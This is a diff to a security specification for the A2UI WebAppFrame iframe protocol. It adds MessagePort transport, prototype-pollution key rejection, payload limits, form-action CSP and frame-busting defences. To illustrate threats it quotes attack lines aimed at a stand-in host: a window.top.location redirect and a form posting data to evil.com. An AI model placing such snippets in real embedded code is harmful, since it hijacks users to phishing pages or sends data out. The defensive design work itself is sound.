@@ -62,15 +62,20 @@ layers:
 
 # 3. The WebAppFrame runtime and communication contract
 
-While simple, LLM-generated applications can use raw, fire-and-forget `window.postMessage` events
-for zero-dependency execution, **human developers should use the official `@a2ui/web-bridge` SDK
-(coming soon)** (or equivalent).
+To prevent compromised frames from spoofing ambient messages, the A2UI protocol strictly requires the use of a private `MessageChannel` for all post-initialization communication between the embedded application and the host.
 
-The `@a2ui/web-bridge` SDK establishes a private `MessageChannel` between the host and the iframe
-and wraps the underlying protocol into a secure, type-safe, and Promise-based API. This hides the
-complexity of request correlation, deep-equality checks, and message origin validation.
+The `@a2ui/web-bridge` SDK (coming soon) establishes this channel automatically and wraps the underlying protocol into a secure, type-safe, and Promise-based API. However, even for zero-dependency or LLM-generated scripts written in raw HTML/JS, the developer or LLM **must** extract the `MessagePort` provided by the host during the `a2ui_app_frame_init` handshake event (typically found at `event.ports[0]`) and use it for all subsequent events. Ambient `window.postMessage` is exclusively reserved for the initial handshake and will be ignored for data and action routing.
 
-However, at the wire level, all communications occur using custom top-level message string tags
+### Transport Layers & Security Enforcement
+
+Because the communication lifecycle transitions from a public broadcast to a private pipe, different security measures apply depending on the phase:
+
+| Phase                             | Message Types                                                                                            | Transport Mechanism          | Required Security Measures                                                                                                                                                                                                                     |
+| :-------------------------------- | :------------------------------------------------------------------------------------------------------- | :--------------------------- | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **Bootstrap & Handshake**         | `a2ui_sandbox_proxy_ready`, `a2ui_sandbox_resource_ready`, `a2ui_app_frame_ready`, `a2ui_app_frame_init` | Ambient `window.postMessage` | **Strict Origin/Source Verification Required:** The host must verify `event.origin` and `event.source === iframe.contentWindow`. The embedded app must verify the host's `event.origin` before accepting the `MessagePort`.                    |
+| **Post-Initialization (Routing)** | `a2ui_action`, `a2ui_data_model_change`, `a2ui_function_call`, `a2ui_size_changed`, etc.                 | Dedicated `MessagePort`      | **No Origin Verification Needed:** The `MessageChannel` is a direct point-to-point pipe. Messages arriving on the port are implicitly secure. However, **Schema Validation** (Section 5.5) is strictly enforced by the host on these payloads. |
+
+At the wire level, all communications occur using custom top-level message string tags
 (`a2ui_*`) with flat keys. The protocol definitions below represent this underlying wire format.
 
 ## 3.1. Sandbox bootstrap lifecycle
@@ -140,7 +145,7 @@ sequenceDiagram
    configuration (`config`), the initial state of the bound data model (`initialData`), and lists
    of authorized actions and client functions. **Host clients must also transfer a `MessagePort`
    (e.g., `event.ports[0]`)** with this message to establish the dedicated 1-to-1 communication
-   bridge for the `@a2ui/web-bridge` SDK.
+   bridge for all subsequent data and event messages.
    ```json
    {
      "type": "a2ui_app_frame_init",
@@ -166,6 +171,8 @@ sequenceDiagram
    ```
 
 ## 3.3. Outgoing messages (Embedded app to host)
+
+Once the initial handshake is complete, all subsequent outgoing messages from the embedded application must be dispatched using the `postMessage` method of the `MessagePort` received during the `a2ui_app_frame_init` handshake (e.g., `hostPort.postMessage({ ... })`). Ambient `window.parent.postMessage` must not be used after the initialization handshake.
 
 ### A. Event dispatch (`a2ui_action`)
 
@@ -541,6 +548,13 @@ Least Privilege:
   applications from monopolizing the host's main thread or initiating infinite render loops, the
   protocol mandates deep-equality checks for state updates and strict throttling/clamping for
   dynamic resize requests.
+- **Prototype Pollution & Deep JSON Defense:** Guarding host bridge services and backend parsers
+  against prototype pollution keys (`__proto__`, `constructor`, `prototype`) and recursive stack
+  overflow attacks from deeply nested structures (e.g., >10 levels) or oversized payloads (e.g., >64 KB).
+- **Top-Level Window Hijacking & Frame-Busting Defense:** Preventing untrusted or partner scripts
+  from attempting `window.top.location = "https://evil.com"` to redirect or hijack the host window by
+  strictly omitting `allow-top-navigation` and `allow-top-navigation-by-user-activation` across all
+  iframe sandbox configurations.
 
 > [!NOTE] **CSP Delivery Nuance:** There is a fundamental difference in how Content Security
 > Policies (CSP) are enforced between the two component types. When fetching the application by URL
@@ -574,6 +588,10 @@ and malicious tab-navigation.
   Web renderers must load the external URL via a nested proxy frame (e.g., A2UI Sandbox Proxy). The
   outer same-origin proxy coordinates message transfers, while the inner iframe is strictly
   sandboxed.
+- **Top-Level Navigation Restriction (Omit `allow-top-navigation`):** The iframe `sandbox` attribute
+  must strictly omit `allow-top-navigation` and `allow-top-navigation-by-user-activation`. This prevents
+  embedded web applications from executing frame-busting scripts (such as assigning
+  `window.top.location = "https://evil.com"`) that would hijack and navigate the host browsing context away.
 
 ## 5.3. WebAppFrameSrcdoc rendering & security specifications
 
@@ -585,7 +603,15 @@ Sandbox to prevent CSRF and exfiltration.
 - **Strict CSP Meta Tag Injection:** Unlike `WebAppFrameUrl`, the renderer receives the raw HTML
   string. It must parse the HTML, strip any author-supplied CSP meta tags, and inject a strict CSP
   meta tag as the first child of the head:
-  `<meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data:; connect-src 'none';">`.
+  `<meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data:; connect-src 'none'; form-action 'none';">`.
+- **Form-Based Exfiltration Prevention (`form-action 'none'`):** When `allow-forms` is included in
+  the iframe sandbox attributes (to allow local interactive form controls), untrusted scripts in
+  `WebAppFrameSrcdoc` could attempt to submit an HTML form (`<form action="https://evil.com/post" method="POST">`)
+  to an external server. Because `connect-src 'none'` only blocks APIs like `fetch` and `XMLHttpRequest`,
+  injecting `form-action 'none';` closes HTML form navigation and submission bypasses.
+- **Top-Level Window Hijacking Prevention:** The iframe sandbox configuration (`allow-scripts allow-forms allow-popups allow-modals`)
+  strictly excludes `allow-top-navigation` and `allow-top-navigation-by-user-activation`. This blocks
+  embedded scripts from redirecting the host window via `window.top.location` or anchor tags with `target="_top"`.
 - **Double-Iframe Sandboxing (Web Platforms):** A single layer iframe does not offer good isolation.
   Web renderers must load raw HTML via a nested proxy frame (e.g., A2UI Sandbox Proxy). The outer
   same-origin proxy coordinates message transfers, while the inner iframe is strictly sandboxed
@@ -630,11 +656,13 @@ The initialization payload must define:
 
 ### 5.5.2. The Interception & Validation Flow
 
-When the embedded app dispatches a window.postMessage event, the WebAppFrame component executes the
-following pipeline before interacting with the host's surface or the backend:
+When the embedded app dispatches a message over the dedicated `MessagePort`, the WebAppFrame component executes the following pipeline before interacting with the host's surface or the backend:
 
-- **Origin Check:** The component verifies that `event.origin` matches the expected allowlisted
-  origin of the iframe.
+- **Origin Check (Fallback):** The component verifies that `event.origin` matches the expected allowlisted origin (if available via the port).
+- **Payload Sanitization & Security Verification:**
+  - _Payload Size Enforcement:_ The component verifies that the serialized message size does not exceed the maximum limit of 64 KB (65,536 bytes).
+  - _Nesting Depth Inspection:_ The component inspects the object hierarchy to ensure the JSON nesting depth does not exceed 10 levels.
+  - _Prototype Pollution Rejection:_ The component recursively checks all property names in the message payload and rejects any message containing forbidden prototype pollution keys (`__proto__`, `constructor`, `prototype`).
 - **Schema Enforcement:**
   - _For `a2ui_action`:_ The component looks up the `action` string in `allowedEvents`. It runs the
     `data` payload against the associated schema (e.g., using a JSON Schema validator).
@@ -642,22 +670,25 @@ following pipeline before interacting with the host's surface or the backend:
     and validates the `value`.
   - _For `a2ui_client_function_call`:_ The component verifies the function is in `allowedFunctions`
     and validates the arguments against the function's schema.
-- **Automatic Rejection:** If the payload fails schema validation, references an unauthorized key,
-  or if the action does not exist in the allowed list, the component **silently drops the message**
-  and logs a security violation warning to the host console. It must not forward malformed data to
-  the backend.
+- **Automatic Rejection:** If the payload fails schema validation, contains prototype pollution keys, exceeds nesting/size limits, references an unauthorized key, or if the action does not exist in the allowed list, the component **silently drops the message** and logs a security violation warning to the host console. It must not forward malformed data to the backend.
 
-### 5.5.3. Protection Against Denial of Service (DoS)
+### 5.5.3. Denial of Service (DoS) Prevention and Rate Limiting
 
-To prevent a compromised iframe from exhausting the host's resources or launching a DoS attack
-against the A2UI server via rapid event spamming:
+To prevent a compromised iframe from exhausting host resources, thrashing the main UI thread, or flooding the A2UI server:
 
-- The WebAppFrame component must implement a configurable **Rate Limiter / Debouncer** on the
-  message event listener.
-- The component must drop messages that exceed a safe threshold (e.g., > 10 events per second) and
-  log a rate-limit warning.
+- **Rate Limiting:** The WebAppFrame component must implement a configurable **Rate Limiter / Debouncer** on the message event listener, dropping messages that exceed a safe threshold (e.g., > 10 events per second) and logging a rate-limit warning.
+- **Dynamic Resize Throttling & Clamping:** The host must clamp and throttle resize events (as specified in Section 5.4) to prevent rapid redraw thrashing and UI jitter.
+- **Deep-Equality Cycle Prevention:** The host and embedded app must enforce structural equality checks on state updates to prevent infinite update ping-pong loops.
 
-### 5.5.4. Trusted Source Bypass
+### 5.5.4. JSON Payload Protection and Prototype Pollution Defense
+
+To prevent untrusted applications from crashing host parsers via stack exhaustion, exhausting memory, or polluting JavaScript object prototypes, the host bridge enforces the following guardrails on all incoming `a2ui_action`, `a2ui_data_model_change`, and `a2ui_function_call` messages:
+
+- **Prototype Pollution Key Rejection:** Host bridge services and backend parsers must recursively inspect all incoming message payloads and reject any payload containing `__proto__`, `constructor`, or `prototype` property keys at any depth.
+- **Maximum JSON Nesting Depth:** The host enforces a strict maximum nesting depth of 10 levels for JSON objects and arrays. Messages exceeding this threshold must be rejected before serialization to prevent call stack exhaustion and `RangeError` crashes.
+- **Maximum Message Payload Size:** The host enforces a maximum serialized payload size limit of 64 KB (65,536 bytes) per message to mitigate memory exhaustion and denial-of-service attacks.
+
+### 5.5.5. Trusted Source Bypass
 
 In scenarios where the embedded application is a trusted first-party tool, the strict schema
 validation overhead can be bypassed to improve performance and allow arbitrary data payloads.
@@ -678,10 +709,15 @@ When this flag is set to true:
 domains. If an LLM Agent is dynamically generating the UI tree, the backend must prevent the Agent
 from applying this bypass to external or untrusted iframe URLs.
 
+### 5.5.6. Top-Level Window Hijacking (Frame-Busting) Prevention
+
+- **Risk Assessment:** Likelihood: MED | Impact: HIGH | Relevant trust tiers: Tier 3 (Zero-trust untrusted) and Tier 2 (Semi-trusted partner).
+- **Security Concern:** Embedded third-party scripts or model-generated HTML may attempt top-level window hijacking (frame-busting) by setting `window.top.location = "https://evil.com"`, modifying `window.parent.location`, or executing link navigations targeting `_top`. This can redirect the host user away from the application to a phishing or malicious landing page.
+- **Mandatory Sandbox Directive Rules:** All iframe `sandbox` attributes configured by host renderers or intermediate sandbox proxies must strictly omit `allow-top-navigation`, `allow-top-navigation-by-user-activation`, and `allow-top-navigation-to-custom-protocols`. Omission of these tokens ensures modern browser security engines reject any attempt by embedded browsing contexts to navigate or manipulate top-level ancestor windows.
+
 # 6. Implementation guidelines
 
-- **Developer SDK (`@a2ui/web-bridge` - Coming Soon):** While raw `postMessage` is specified for
-  zero-dependency AI generation, human developers building `WebAppFrameUrl` targets should import
+- **Developer SDK (`@a2ui/web-bridge` - Coming Soon):** While raw `MessagePort` bindings are required for zero-dependency AI generation, human developers building `WebAppFrameUrl` targets should import
   the official `@a2ui/web-bridge` SDK (coming soon) to wrap the communication in a secure
   `MessageChannel` with Promise-based function invocations.
 - **SafeContentFrame / Double-Iframe Sandboxing:** A single layer iframe does not offer good
@@ -691,10 +727,11 @@ from applying this bypass to external or untrusted iframe URLs.
   provided in the A2UI repository) to embed applications for both `WebAppFrameSrcdoc` and
   `WebAppFrameUrl`. This proxy achieves the same strict isolation as enterprise technologies (like
   Google's SafeContentFrame) by using an outer same-origin frame that coordinates verified message
-  transfers, and an inner frame that is strictly sandboxed without `allow-same-origin`. While this
-  may incur additional latency, it significantly improves security for the host application,
-  especially when the content is generated by an LLM-powered agent. This shifts the Firewall
-  operation duty that the proxy-iframe took care of to the WebAppFrame component itself.
+  transfers, and an inner frame that is strictly sandboxed without `allow-same-origin`,
+  `allow-top-navigation`, or `allow-top-navigation-by-user-activation`. While this may incur additional
+  latency, it significantly improves security for the host application, especially when the content
+  is generated by an LLM-powered agent. This shifts the Firewall operation duty that the proxy-iframe
+  took care of to the WebAppFrame component itself.
 
 # References
 
